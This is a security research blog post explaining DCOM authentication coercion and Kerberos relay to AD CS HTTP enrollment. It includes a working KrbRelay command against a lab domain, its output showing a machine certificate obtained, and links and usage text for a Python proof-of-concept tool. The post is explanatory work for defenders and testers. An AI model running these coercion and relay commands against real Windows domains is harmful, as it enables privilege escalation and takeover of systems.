---
title: Three-Headed Potato Dog
url: https://blog.compass-security.com/2024/09/three-headed-potato-dog/
source: Over Security - Cybersecurity news aggregator
date: 2024-09-18
fetch_date: 2025-10-06T18:27:09.055765
---

# Three-Headed Potato Dog

## [Compass Security Blog](https://blog.compass-security.com "Compass Security Blog — Offensive Defense")

### Offensive Defense

* [Home](https://blog.compass-security.com/)
* [Archive](https://blog.compass-security.com/archive/)
* [Contact](https://blog.compass-security.com/contact/)
* [Newsletter](https://blog.compass-security.com/mailing-list-tigerinfo/)

* [Home](https://blog.compass-security.com/)
* [Archive](https://blog.compass-security.com/archive/)
* [Contact](https://blog.compass-security.com/contact/)
* [Newsletter](https://blog.compass-security.com/mailing-list-tigerinfo/)

# [Three-Headed Potato Dog](https://blog.compass-security.com/2024/09/three-headed-potato-dog/ "Three-Headed Potato Dog")

[September 17, 2024](https://blog.compass-security.com/2024/09/three-headed-potato-dog/ "Three-Headed Potato Dog")
 /
[Sylvain Heiniger](https://blog.compass-security.com/author/sheinige/ "Posts by Sylvain Heiniger")
 /
[0 Comments](https://blog.compass-security.com/2024/09/three-headed-potato-dog/#respond)

Earlier this year, several security researchers published research about using DCOM to coerce Windows systems to authenticate to other systems. This can be misused to relay the authentication to NTLM or Kerberos, to AD CS over HTTP for instance.

This sounds like a hot and complex topic. Let’s take a look back how this started and how it works.

## Where it all started

In February, [Andrea Pierini](https://x.com/decoder_it) posted a technique resembling his previous potato exploits but triggering the authentication from a remote server instead of the local machine. He discovered DCOM interfaces on AD CS servers which allow him to receive authenticated connections that can be relayed:

> Hello: I'm your ADCS server and I want to authenticate against you. My latest Post and PoC are out. You can read it here: <https://t.co/qzcSkFIySk> Enjoy :)
>
> — ap (@decoder\_it) [February 26, 2024](https://twitter.com/decoder_it/status/1762146535876296783?ref_src=twsrc%5Etfw)

In his blogpost, he explained that it’s not only possible to coerce NTLM connections, but also Kerberos authenticated connections, because the SPN can be controlled by the attacker.

To this, [Tianze Ding](https://x.com/D1iv3) replied that relaying to Kerberos is even more powerful, because it can be relayed back to the coerced machine:

> We can relay back to the same machine using Kerberos relay instead of NTLM relay. I discovered this attack vector more than a year ago. I will describe it in detail in upcoming Black Hat Asia 2024 <https://t.co/zz9z3n6t0h>… and introduce more interesting attacks. [pic.twitter.com/LquR6UkZn5](https://t.co/LquR6UkZn5)
>
> — Dlive (@D1iv3) [February 27, 2024](https://twitter.com/D1iv3/status/1762443475260527092?ref_src=twsrc%5Etfw)

Finally, a few months later, [Andrea Pierini](https://x.com/decoder_it) let the cat out of the bag and released his SilverPotato, which demonstrated remote cross-session coercion. This allows an attacker to not only coerce the machine account for authentication, but also the account of any other logged in user on the remote system.

https://twitter.com/decoder\_it/status/1783134821784428671

When I read the first tweet in February, my curiosity was piqued and I modified the [KrbRelay](https://github.com/cube0x0/KrbRelay) project to make it remote and cross-session capable, because Andrea did not release his PoC code. [A few lines of code](https://gist.github.com/sploutchy/0f7a913c6aacc90f85339124a93dc78b) and it worked, easy enough!

### PoC||GTFO

The following modified version of KrbRelay coerces the AD CS system `ca1.child.testlab.local` via the DCOM interface to authenticate to the attacker’s IP address `10.0.1.10` using the attacker-controlled SPN `http/ca1.child.testlab.local`. Because Kerberos authentication can be relayed back to the originating machine, the received connection can be relayed to the AD CS HTTP enrollment endpoint to get a certificate for the authenticated machine account:

```
> KrbRelay.exe  -spn http/ca1.child.testlab.local -clsid D99E6E74-FC88-11D0-B498-00A0C90312F3 -endpoint certsrv/ -adcs Computer -target ca1.child.testlab.local -relayip 10.0.1.10
[*] Rewriting function table
[*] Rewriting PEB
[*] GetModuleFileName: System
[*] Init com server
[*] GetModuleFileName: C:\Users\tmassie\Documents\krb\KrbRelay.exe
[*] Register com server

[*] Forcing SYSTEM authentication
[*] Using CLSID: d99e6e74-fc88-11d0-b498-00a0c90312f3
[*] apReq: 6082072[CUT BY COMPASS]88218873
[*] apRep1: 6f818[CUT BY COMPASS]adb7d4
[*] AcceptSecurityContext: SEC_I_CONTINUE_NEEDED
[*] fContextReq: Delegate, MutualAuth, ReplayDetect, SequenceDetect, Confidentiality, UseDceStyle, Connection
[*] apRep2: 6f5b3[CUT BY COMPASS]3c25dbb
[+] HTTP session established
[*] Authentication Cookie;
ASPSESSIONIDACRTDCAR=GLCJEKBBBFHOPLEGHFMLCJNM; path=/
[*] Requesting a certificate
[*] Testing: Computer
[+] Found valid template: Computer
[*] SUCCESS (ReqID: 4)
[*] Downloading certificate
[*] Exporting certificate & private key
MIACAQ[CUT BY COMPASS]BAAAAA==
```

This certificate can now be used to authenticate as the machine account and finally take over the system (e.g. via RBCD or Shadow Credentials).

## Coercion using DCOM

How does it work? In [talk at Black Hat Asia 2024](https://i.blackhat.com/Asia-24/Presentations/Asia-24-Ding-CertifiedDCOM-The-Privilege-Escalation-Journey-to-Domain-Admin.pdf), [Tianze Ding](https://x.com/D1iv3) explains the DCOM coercion primitive used:

[![](https://blog.compass-security.com/wp-content/uploads/2024/07/Page-1-1024x457.png)](https://blog.compass-security.com/wp-content/uploads/2024/07/Page-1.png)

1. The attacker remotely activates a COM class using a crafted storage object
2. During unmarshalling, the COM server connects to the attacker’s server
   * first over RPC to resolve the network address of the machine where the remote COM object is (via the OXID resolver)
   * then over COM to access the storage
3. These two connections are authenticated and can be relayed. Because the OXID resolver of the attacker is used, the attacker can specify an arbitrary SPN which is used in the 2nd authentication. This 2nd authentication can then be relayed (DCOM hardening only allows relay to HTTP or unprotected LDAP)

## Potato.py

Fair enough. But I wanted to understand what happens under the hood, so I decided to try to implement the coercion mechanism in Python using [Impacket](https://github.com/fortra/impacket).

### The Process

`RemoteCreateInstance` and the associated structures are [already implemented in Impacket](https://github.com/fortra/impacket/blob/master/impacket/dcerpc/v5/dcomrt.py#L1766). So how hard can it be? Well not easy!

I started looking at the packet sent by Windows (using KrbRelay.exe) and filling the structure accordingly. This was not enough. Comparing packets was difficult because of the poor support of Wireshark for `ISystemActivator`, so I ended up [extending the Wireshark dissector for DCOM](https://gitlab.com/wireshark/wireshark/-/merge_requests/16170) in the doing.

After long hours of debugging and fixing some DCOM structures, I finally got a working PoC, you can find it here: <https://github.com/sploutchy/impacket/blob/potato/examples/potato.py>

### How-To

The tool takes a target, a relay target, a CLSID and optionally a session ID and/or an SPN:

```
$ potato.py -h
Impacket v0.12.0.dev1+20240627.132501.185402b6 - Copyright 2023 Fortra

usage: potato.py [-h] [-debug] -clsid CLSID [-relay-ip IP] [-relay-hostname HOSTNAME] [-relay-port HOSTNAME] [session-id SESSION_ID] [-kerberos]
                 [-spn PROTOCOL\SERVER] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-target-ip ip address]
                 target

Potato implementation.

positional arguments:
  target                    [[domain/]username[:password]@]<targetName or address>

options:
  -h, --help                show this help message and exit
  -debug                    Turn DEBUG...